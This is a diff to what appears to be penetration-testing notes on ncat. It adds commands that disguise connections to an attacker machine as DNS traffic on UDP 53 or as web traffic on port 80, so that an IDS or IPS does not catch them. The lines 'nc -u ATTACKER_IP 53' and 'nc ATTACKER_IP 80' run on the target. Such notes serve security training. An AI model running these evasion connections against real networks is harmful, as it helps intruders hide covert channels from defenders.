@@ -13,7 +13,7 @@ Options:
   -u   Listen using UDP
 
 Network Security Evasion via Protocol Manipulation:
-Rely on a Different Protocol
+Rely on a Different Protocol:
   nc -ulvnp PORT_NUM        To listen using UDP where port number is the port you want to listen to
                             Note that unless you add -u, ncat will use TCP by default
   nc -u TARGET_IP PORT_NUM  To connect to an Ncat instance listening on a UDP port
@@ -24,3 +24,9 @@ Informational:
     it is a usual TCP connection with an SMTP server, unless the IDS/IPS provides deep packet inspection (DPI).
     Executing ncat -ulvnp 162 on the attacker machine and connecting to it will give the illusion
     that it is a regular UDP communication with an SNMP server unless the IDS/IPS supports DPI.
+
+Manipulate (Source) TCP/UDP Port:
+  nc -ulvnp 53           You can try to camouflage the traffic as if it is some DNS traffic to listen on UDP port `53`, as a DNS server would
+  nc -u ATTACKER_IP 53   On the target, you can make it connect to the listening server
+  nc -lvnp 80            Alternatively, you can make it appear more like web traffic where clients communicate with an HTTP server
+  nc ATTACKER_IP 80      On the target, you can make it connect to the listening server
